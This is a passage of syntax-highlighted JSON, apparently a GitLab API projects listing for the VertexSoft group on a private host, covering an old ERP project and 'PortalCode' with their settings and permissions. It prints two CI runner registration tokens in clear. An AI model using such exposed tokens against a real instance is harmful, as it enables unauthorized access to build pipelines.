        <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"star_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token property">"last_activity_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:00:05.004Z"</span><span class="token punctuation">,</span>
        <span class="token property">"namespace"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexSoft"</span><span class="token punctuation">,</span>
            <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>
            <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"group"</span><span class="token punctuation">,</span>
            <span class="token property">"full_path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>
            <span class="token property">"parent_id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/groups/vertexsoft"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token property">"repository_storage"</span><span class="token operator">:</span> <span class="token string">"default"</span><span class="token punctuation">,</span>
        <span class="token property">"_links"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"self"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2"</span><span class="token punctuation">,</span>
            <span class="token property">"issues"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/issues"</span><span class="token punctuation">,</span>
            <span class="token property">"merge_requests"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/merge_requests"</span><span class="token punctuation">,</span>
            <span class="token property">"repo_branches"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/repository/branches"</span><span class="token punctuation">,</span>
            <span class="token property">"labels"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/labels"</span><span class="token punctuation">,</span>
            <span class="token property">"events"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/events"</span><span class="token punctuation">,</span>
            <span class="token property">"members"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/members"</span><span class="token punctuation">,</span>
            <span class="token property">"cluster_agents"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/cluster_agents"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token property">"packages_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"empty_repo"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"archived"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"visibility"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>
        <span class="token property">"resolve_outdated_diff_discussions"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"container_expiration_policy"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"cadence"</span><span class="token operator">:</span> <span class="token string">"1d"</span><span class="token punctuation">,</span>
            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"keep_n"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>
            <span class="token property">"older_than"</span><span class="token operator">:</span> <span class="token string">"90d"</span><span class="token punctuation">,</span>
            <span class="token property">"name_regex"</span><span class="token operator">:</span> <span class="token string">".*"</span><span class="token punctuation">,</span>
            <span class="token property">"name_regex_keep"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"next_run_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-12T17:00:07.041Z"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token property">"repository_object_format"</span><span class="token operator">:</span> <span class="token string">"sha1"</span><span class="token punctuation">,</span>
        <span class="token property">"issues_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"merge_requests_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"wiki_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"jobs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"snippets_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"container_registry_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"service_desk_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"service_desk_address"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"can_create_merge_request_in"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"issues_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"repository_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"merge_requests_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"forking_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"wiki_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"builds_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"snippets_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"pages_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>
        <span class="token property">"analytics_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"container_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"security_and_compliance_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>
        <span class="token property">"releases_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"environments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"feature_flags_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"infrastructure_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"monitor_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"model_experiments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"model_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"emails_disabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"emails_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"shared_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"lfs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"creator_id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
        <span class="token property">"import_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"import_type"</span><span class="token operator">:</span> <span class="token string">"gitlab_project"</span><span class="token punctuation">,</span>
        <span class="token property">"import_status"</span><span class="token operator">:</span> <span class="token string">"finished"</span><span class="token punctuation">,</span>
        <span class="token property">"open_issues_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token property">"description_html"</span><span class="token operator">:</span> <span class="token string">"&lt;p data-sourcepos=\"1:1-1:27\" dir=\"auto\">VertexSoft's old ERP system&lt;/p>"</span><span class="token punctuation">,</span>
        <span class="token property">"updated_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:00:07.428Z"</span><span class="token punctuation">,</span>
        <span class="token property">"ci_default_git_depth"</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>
        <span class="token property">"ci_forward_deployment_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"ci_forward_deployment_rollback_allowed"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"ci_job_token_scope_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"ci_separated_caches"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"ci_allow_fork_pipelines_to_run_in_parent_project"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"build_git_strategy"</span><span class="token operator">:</span> <span class="token string">"fetch"</span><span class="token punctuation">,</span>
        <span class="token property">"keep_latest_artifact"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"restrict_user_defined_variables"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"runners_token"</span><span class="token operator">:</span> <span class="token string">"GR1348941iNU3bBzdNg5pzdrmapMJ"</span><span class="token punctuation">,</span>
        <span class="token property">"runner_token_expiration_interval"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"group_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"auto_cancel_pending_pipelines"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"build_timeout"</span><span class="token operator">:</span> <span class="token number">3600</span><span class="token punctuation">,</span>
        <span class="token property">"auto_devops_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"auto_devops_deploy_strategy"</span><span class="token operator">:</span> <span class="token string">"continuous"</span><span class="token punctuation">,</span>
        <span class="token property">"ci_config_path"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"public_jobs"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"shared_with_groups"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token property">"only_allow_merge_if_pipeline_succeeds"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"allow_merge_on_skipped_pipeline"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"request_access_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"only_allow_merge_if_all_discussions_are_resolved"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"remove_source_branch_after_merge"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"printing_merge_request_link_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"merge_method"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>
        <span class="token property">"squash_option"</span><span class="token operator">:</span> <span class="token string">"default_off"</span><span class="token punctuation">,</span>
        <span class="token property">"enforce_auth_checks_on_uploads"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"suggestion_commit_message"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"merge_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"squash_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"issue_branch_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"warn_about_potentially_unwanted_characters"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"autoclose_referenced_issues"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"permissions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"project_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">40</span><span class="token punctuation">,</span>
                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token null keyword">null</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            <span class="token property">"group_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">50</span><span class="token punctuation">,</span>
                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token number">3</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#123;</span>
        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"PortalCode"</span><span class="token punctuation">,</span>
        <span class="token property">"name_with_namespace"</span><span class="token operator">:</span> <span class="token string">"VertexSoft / PortalCode"</span><span class="token punctuation">,</span>
        <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"portalcode"</span><span class="token punctuation">,</span>
        <span class="token property">"path_with_namespace"</span><span class="token operator">:</span> <span class="token string">"vertexsoft/portalcode"</span><span class="token punctuation">,</span>
        <span class="token property">"created_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T15:53:27.257Z"</span><span class="token punctuation">,</span>
        <span class="token property">"default_branch"</span><span class="token operator">:</span> <span class="token string">"main"</span><span class="token punctuation">,</span>
        <span class="token property">"tag_list"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token property">"topics"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token property">"ssh_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"git@192.168.8.42:vertexsoft/portalcode.git"</span><span class="token punctuation">,</span>
        <span class="token property">"http_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/portalcode.git"</span><span class="token punctuation">,</span>
        <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/portalcode"</span><span class="token punctuation">,</span>
        <span class="token property">"readme_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/portalcode/-/blob/main/README.md"</span><span class="token punctuation">,</span>
        <span class="token property">"forks_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"star_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token property">"last_activity_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-15T14:30:40.441Z"</span><span class="token punctuation">,</span>
        <span class="token property">"namespace"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexSoft"</span><span class="token punctuation">,</span>
            <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>
            <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"group"</span><span class="token punctuation">,</span>
            <span class="token property">"full_path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>
            <span class="token property">"parent_id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/groups/vertexsoft"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token property">"repository_storage"</span><span class="token operator">:</span> <span class="token string">"default"</span><span class="token punctuation">,</span>
        <span class="token property">"_links"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"self"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1"</span><span class="token punctuation">,</span>
            <span class="token property">"issues"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/issues"</span><span class="token punctuation">,</span>
            <span class="token property">"merge_requests"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/merge_requests"</span><span class="token punctuation">,</span>
            <span class="token property">"repo_branches"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/repository/branches"</span><span class="token punctuation">,</span>
            <span class="token property">"labels"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/labels"</span><span class="token punctuation">,</span>
            <span class="token property">"events"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/events"</span><span class="token punctuation">,</span>
            <span class="token property">"members"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/members"</span><span class="token punctuation">,</span>
            <span class="token property">"cluster_agents"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/cluster_agents"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token property">"packages_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"empty_repo"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"archived"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"visibility"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>
        <span class="token property">"resolve_outdated_diff_discussions"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"container_expiration_policy"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"cadence"</span><span class="token operator">:</span> <span class="token string">"1d"</span><span class="token punctuation">,</span>
            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"keep_n"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>
            <span class="token property">"older_than"</span><span class="token operator">:</span> <span class="token string">"90d"</span><span class="token punctuation">,</span>
            <span class="token property">"name_regex"</span><span class="token operator">:</span> <span class="token string">".*"</span><span class="token punctuation">,</span>
            <span class="token property">"name_regex_keep"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"next_run_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-12T15:53:27.309Z"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token property">"repository_object_format"</span><span class="token operator">:</span> <span class="token string">"sha1"</span><span class="token punctuation">,</span>
        <span class="token property">"issues_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"merge_requests_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"wiki_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"jobs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"snippets_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"container_registry_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"service_desk_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"service_desk_address"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"can_create_merge_request_in"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"issues_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"repository_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"merge_requests_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"forking_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"wiki_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"builds_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"snippets_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"pages_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>
        <span class="token property">"analytics_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"container_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"security_and_compliance_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>
        <span class="token property">"releases_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"environments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"feature_flags_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"infrastructure_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"monitor_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"model_experiments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"model_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"emails_disabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"emails_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"shared_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"lfs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"creator_id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
        <span class="token property">"import_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"import_type"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"import_status"</span><span class="token operator">:</span> <span class="token string">"none"</span><span class="token punctuation">,</span>
        <span class="token property">"open_issues_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token property">"description_html"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
        <span class="token property">"updated_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-15T14:37:09.617Z"</span><span class="token punctuation">,</span>
        <span class="token property">"ci_default_git_depth"</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>
        <span class="token property">"ci_forward_deployment_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"ci_forward_deployment_rollback_allowed"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"ci_job_token_scope_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"ci_separated_caches"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"ci_allow_fork_pipelines_to_run_in_parent_project"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"build_git_strategy"</span><span class="token operator">:</span> <span class="token string">"fetch"</span><span class="token punctuation">,</span>
        <span class="token property">"keep_latest_artifact"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"restrict_user_defined_variables"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"runners_token"</span><span class="token operator">:</span> <span class="token string">"GR13489414oQjRCnTobkTwZpR65iS"</span><span class="token punctuation">,</span>
        <span class="token property">"runner_token_expiration_interval"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"group_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"auto_cancel_pending_pipelines"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"build_timeout"</span><span class="token operator">:</span> <span class="token number">3600</span><span class="token punctuation">,</span>
        <span class="token property">"auto_devops_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"auto_devops_deploy_strategy"</span><span class="token operator">:</span> <span class="token string">"continuous"</span><span class="token punctuation">,</span>
        <span class="token property">"ci_config_path"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"public_jobs"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"shared_with_groups"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token property">"only_allow_merge_if_pipeline_succeeds"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"allow_merge_on_skipped_pipeline"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"request_access_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"only_allow_merge_if_all_discussions_are_resolved"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"remove_source_branch_after_merge"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"printing_merge_request_link_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"merge_method"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>
        <span class="token property">"squash_option"</span><span class="token operator">:</span> <span class="token string">"default_off"</span><span class="token punctuation">,</span>
        <span class="token property">"enforce_auth_checks_on_uploads"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"suggestion_commit_message"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"merge_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"squash_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"issue_branch_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"warn_about_potentially_unwanted_characters"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"autoclose_referenced_issues"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"permissions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"project_access"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"group_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">50</span><span class="token punctuation">,</span>
                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token number">3</span>
            <span class="token punctuation">&#125;</span>
